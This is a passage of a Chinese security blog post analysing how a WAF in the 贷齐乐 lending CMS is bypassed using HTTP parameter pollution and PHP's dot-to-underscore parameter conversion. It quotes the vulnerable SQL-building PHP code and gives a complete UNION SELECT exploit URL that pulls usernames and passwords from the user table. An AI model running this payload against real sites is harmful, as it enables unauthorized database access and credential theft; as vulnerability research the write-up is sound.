+<p><a href="https://bugs.leavesongs.com/images/2016/01/22/118677de-cf09-4b73-b248-5205a03e8067.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/118677de-cf09-4b73-b248-5205a03e8067.jpg" alt="14534011420236.jpg"></a></p>
+<p>输出的是22222，也就是说，当我们输入两个相同名字的参数的时候，这段脚本也是取后一个的。<br>实验做完了，回到漏洞。<br>我一直在思考，假设我有一个办法，在第一次WAF检测参数的时候，检测的是22222，但后面覆盖request的时候，拿到的是11111，那么不就可以造成WAF的绕过了么？<br>但上述两个实验的结果表示，我这个假设是不成立的。二者获取的结果都是22222 。那么，这个思路是否就是不可行的了？<br>撸大师曾经提到过一个php特性： <a href="http://wooyun.org/bugs/wooyun-2010-064792" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2010-064792</a><br>php自身在解析请求的时候，如果参数名字中包含” “、”.”、”[“这几个字符，会将他们转换成下划线。<br>那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php先将user.id转换成user_id，即为/t.php?user_id=11111&amp;user_id=22222 ，再获取到的<code>$_REQUEST[&#39;user_id&#39;]</code>就是22222。<br>可在<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>中，user_id和user.id却是两个完全不同的参数名，那么切割覆盖后，获取的<code>$_REQUEST[&#39;user_id&#39;]</code>却是11111。<br>完美践行了我上述的思路：WAF检测的是22222，实际插入数据库的却是11111.</p>
+<h3 id="0x04-实践是检验真理的唯一标准"><a href="#0x04-实践是检验真理的唯一标准" class="headerlink" title="0x04 实践是检验真理的唯一标准"></a>0x04 实践是检验真理的唯一标准</h3><p>上一节，实际上都是我在YY，这一节我需要找到一个真正满足条件的漏洞来。上述的绕过思路是有条件限制的，如下：</p>
+<ol>
+<li>先需要找到一个注入点</li>
+<li>注入点可控变量需要获取自$_REQUEST</li>
+<li>变量的名字必须包含下划线</li>
+</ol>
+<p>好找吗？其实在千疮百孔的贷齐乐系统中，这些条件很容易满足。文件 /core/user.class.php 394行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public static function GetOne($data = array())&#123;</span><br><span class="line">    global $mysql;</span><br><span class="line">    $user_id = isset($data[&apos;user_id&apos;])?$data[&apos;user_id&apos;]:&quot;&quot;;</span><br><span class="line">    $username = isset($data[&apos;username&apos;])?$data[&apos;username&apos;]:&quot;&quot;;</span><br><span class="line">    $password = isset($data[&apos;password&apos;])?$data[&apos;password&apos;]:&quot;&quot;;</span><br><span class="line">    $email = isset($data[&apos;email&apos;])?$data[&apos;email&apos;]:&quot;&quot;;</span><br><span class="line">    $type_id = isset($data[&apos;type_id&apos;])?$data[&apos;type_id&apos;]:&quot;&quot;;</span><br><span class="line">    $sql = &quot;CREATE TABLE IF NOT EXISTS `&#123;user_cache&#125;` (</span><br><span class="line">         `user_id` int(11) NOT NULL DEFAULT &apos;0&apos;)&quot;;</span><br><span class="line">    $mysql -&gt;db_query($sql);</span><br><span class="line">    if ($user_id == &quot;&quot; &amp;&amp; $username == &quot;&quot;) return self::ERROR;</span><br><span class="line">    $sql = &quot;select p2.name as typename,p2.type,p3.*,p4.*,p5.*,p1.*  from `&#123;user&#125;` as p1 </span><br><span class="line">            left join `&#123;user_type&#125;` as p2 on  p1.type_id = p2.type_id   </span><br><span class="line">            left join `&#123;user_cache&#125;` as p3 on  p3.user_id = p1.user_id  </span><br><span class="line">            left join `&#123;account&#125;` as p4 on  p4.user_id = p1.user_id     </span><br><span class="line">            left join `&#123;userinfo&#125;` as p5 on  p5.user_id = p1.user_id    </span><br><span class="line">            where 1=1 &quot;;</span><br><span class="line">    if ($user_id!=&quot;&quot;)&#123;</span><br><span class="line">        $sql .= &quot; and p1.user_id = $user_id&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($password!=&quot;&quot;)&#123;</span><br><span class="line">        $sql .= &quot; and  p1.password = &apos;&quot;.md5($password).&quot;&apos;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($username!=&quot;&quot;)&#123;</span><br><span class="line">        $sql .= &quot; and  p1.username = &apos;$username&apos;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($email!=&quot;&quot;)&#123;</span><br><span class="line">        $sql .= &quot; and  p1.email = &apos;$email&apos;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($type_id!=&quot;&quot;)&#123;</span><br><span class="line">        $sql .= &quot; and p1.type_id = &apos;$type_id&apos;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $mysql-&gt;db_fetch_array($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个user_id，就可以满足条件。我们访问如下链接，即可发现报错：</p>
+<p><a href="https://bugs.leavesongs.com/images/2016/01/22/cc2a190d-d46e-4333-9db4-40957b5804e6.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/cc2a190d-d46e-4333-9db4-40957b5804e6.jpg" alt="14534034866079.jpg"></a></p>
+<p>可说明这是一个SQL注入。我们用常规SQL注入手段，即可发现被WAF拦截：</p>
+<p><a href="https://bugs.leavesongs.com/images/2016/01/22/54927aaf-a245-4be5-921f-b9355ffae800.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/54927aaf-a245-4be5-921f-b9355ffae800.jpg" alt="14534035537289.jpg"></a></p>
+<p>那么我们用上一节说的手法，加个user.id=123123，试试还会不会被拦截了：</p>
+<p><a href="https://bugs.leavesongs.com/images/2016/01/22/6f934f65-32f5-43e5-ac1c-b93bae98ac74.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/6f934f65-32f5-43e5-ac1c-b93bae98ac74.jpg" alt="14534037105927.jpg"></a></p>
+<p>妥妥了，不拦截了，而且SQL注入也可以正常进行。<br>因为获取的是REQUEST_URI，所以特殊字符会被url编码，没关系可以用一些关键词替换。另外，我们这个方法只能绕过检测的WAF，没法绕过safe.inc.php里替换的WAF，所以还是没法使用括号。<br>即使如此，对于union select注入来说，括号什么的完全不需要呀~<br>最后构造的exp为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://**.**.**.**/?query_site=home&amp;user_id=-1/**/Union/**/SElect/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,username,password,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194/**/from/**/dw_user/**/limit/**/0,1&amp;user.id=1</span><br></pre></td></tr></table></figure>
+<p>可以直接注射获得任意数据库内信息，比如管理员密码：</p>
+<p><a href="https://bugs.leavesongs.com/images/2016/01/22/a45f0002-de7f-486d-bed9-8dd42cd76f71.jpg" target="_blank" rel="noopener"><img src="https://bugs.leavesongs.com/images/2016/01/22/a45f0002-de7f-486d-bed9-8dd42cd76f71.jpg" alt="14534039362628.jpg"></a></p>
+<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>这个洞的挖掘包括利用其实很巧妙，利用的是hpp+php特性，来绕过CMS应用中变态的WAF。造成漏洞 的根本原因不在hpp，也不在php的这个特性，根本原因是贷齐乐内部存在太多显而易见的SQL注入漏洞。<br>但由于其官方开发人员过于相信WAF，或者说他们并没有正确处理SQL注入漏洞的能力，只能通过拦截一些关键字来抵御SQL注入。那么一旦WAF被绕过，将造成无法挽回的损失。</p>
+</excerpt>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2019/09/07/无需登录绕过waf可union-select跨表查询/">无需登录绕过waf可union-select跨表查询</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">yearn</a></p>
+        <p><span>Created:</span>2019-09-07, 10:54:35</p>
+        <p><span>Updated:</span>2019-09-07, 11:02:47</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2019/09/07/无需登录绕过waf可union-select跨表查询/" title="无需登录绕过waf可union-select跨表查询">https://yearn.online/2019/09/07/无需登录绕过waf可union-select跨表查询/</a>
+            <span class="copy-path" data-clipboard-text="From https://yearn.online/2019/09/07/无需登录绕过waf可union-select跨表查询/　　By yearn" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/09/20/后端基础SQL—高级查询与子查询/">
+                    后端基础SQL—高级查询与子查询
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/09/07/waf/">
+                    waf
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-被WAF武装的贷齐乐"><span class="toc-number">1.</span> <span class="toc-text">0x01 被WAF武装的贷齐乐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-变量获取的逻辑顺序"><span class="toc-number">2.</span> <span class="toc-text">0x02 变量获取的逻辑顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-PHP小特性带来的大作用"><span class="toc-number">3.</span> <span class="toc-text">0x03 PHP小特性带来的大作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-实践是检验真理的唯一标准"><span class="toc-number">4.</span> <span class="toc-text">0x04 实践是检验真理的唯一标准</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-总结"><span class="toc-number">5.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"true"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"无需登录绕过waf可union-select跨表查询　| 绝大部分的不公平来源于自身的能力，别忘记你的情敌正在努力　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2019/09/07/无需登录绕过waf可union-select跨表查询/" data-title="无需登录绕过waf可union-select跨表查询" data-url="https://yearn.online/2019/09/07/无需登录绕过waf可union-select跨表查询/"></div>
+    <script>
+        var duoshuoQuery = {short_name:""};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/09/20/后端基础SQL—高级查询与子查询/" title="Pre: 后端基础SQL—高级查询与子查询">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/09/07/waf/" title="Next: waf">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/02/PHP远程代码执行漏洞预警（CVE-2019-11043）/">PHP远程代码执行漏洞预警（CVE-2019-11043）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/变量覆盖漏洞-1/">变量覆盖漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/30/XXE-实体注入 -1/">XXE - 实体注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/29/XXE漏洞(CVE-2019-2888)分析/">WebLogic EJBTaglibDescriptor XXE漏洞(CVE-2019-2888)分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/SSRF-服务器端请求伪造-1/">SSRF - 服务器端请求伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/26/探究if条件语句引发的两个Web漏洞/">探究if条件语句引发的两个Web漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/25/文件上传漏洞-解析、验证伪造三/">文件上传漏洞----解析、验证伪造 三</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/文件上传漏洞-解析、验证伪造二/">文件上传漏洞----解析、验证伪造 二</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/22/WordPress =5.2.3/">WordPress <=5.2.3：如何查看未授权文章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/21/文件上传漏洞-解析、验证伪造一/">文件上传漏洞----解析、验证、伪造 一</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/19/CSP绕过思路及总结/">CSP绕过思路及总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/18/CSRF-1/">CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/17/PCRE绕过/">PCRE绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/16/Dom-Based-XSS-1/">Dom Based XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/15/储存型XSS-1/">储存型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/反序列化导致任意代码执行/">Typecho install.php 反序列化导致任意代码执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/XSS的原理分析与解剖-1/">XSS的原理分析与解剖</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/09/Linux提权/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/09/Oracle注入-—-报错注入/">Oracle注入 — 报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/08/MSSQL注入-—-反弹注入/">MSSQL注入 — 反弹注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/06/MySQL注入-—-Dns-注入/">MySQL注入 — Dns 注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/03/通过Shodan发现目标应用Marathon服务的RCE漏洞/">通过Shodan发现目标应用Marathon服务的RCE漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/01/DNS隧道流量分析/">DNS隧道流量分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/01/Acccess偏移注入-1/">Acccess偏移注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/26/WordPress插件中的XSS漏洞的复现分析与利用/">WordPress插件中的XSS漏洞的复现分析与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/26/宽字节注入-1/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/25/盲注-1/">盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/MS08-067如何利用/">MS08_067如何利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/POST注入-HEAD注入/">POST注入/HEAD注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/22/SQL注入的原理分析/">SQL注入的原理分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/21/正则表达式/">正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/20/后端基础SQL—高级查询与子查询/">后端基础SQL—高级查询与子查询</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/07/无需登录绕过waf可union-select跨表查询/">无需登录绕过waf可union-select跨表查询</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/07/waf/">waf</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/01/Sql注入 - 0day审计案例/">Sql注入 - 0day审计案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/28/支付漏洞/">支付漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/平行越权、垂直越权/">平行越权、垂直越权</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/验证码绕过、密码找回漏洞/">验证码绕过、密码找回漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/unserialize反序列化漏洞/">unserialize反序列化漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/27/本地包含与远程包含/">本地包含与远程包含</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/23/变量覆盖漏洞/">变量覆盖漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/21/SSRF-服务器端请求伪造/">SSRF - 服务器端请求伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/XXE-实体注入/">XXE - 实体注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/文件上传漏洞-解析、验证伪造（三）/">文件上传漏洞----解析、验证伪造（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/18/文件上传漏洞-解析、验证伪造（二）/">文件上传漏洞----解析、验证伪造（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/09/文件上传漏洞-解析、验证伪造（一）/">文件上传漏洞----解析、验证、伪造（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/08/CSRF/">CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/Dom-Based-XSS/">Dom Based XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/储存型XSS/">储存型XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/XSS的原理分析与解剖/">XSS的原理分析与解剖</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/27/Oracle报错注入/">Oracle注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/MSQL反弹注入0-0/">MSQL反弹注入0.0</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/25/Acccess偏移注入/">Acccess偏移注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/MYSQL-Dns注入/">MYSQL-Dns注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/宽字节注入/">宽字节注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/盲注/">MYSQL注入天书之盲注讲解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/POST注入原理分分析/">POST注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/sql注入原理分析/">sql注入原理分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/正则小试牛刀/">正则小试牛刀</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/测试哦！/">测试哦！</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019 yearn
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>|</span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+             title: "a.article-title, .article-more-link a", 
+             post: ".article-entry a[href], .copyright a[href]", 
+             tags: ".article-tag a", 
+             categories: ".article-category a, a.tag-list-link", 
+             articleNav: "#article-nav a, #post-nav-button a", 
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+             menu: ".header-menu a", 
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":150},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
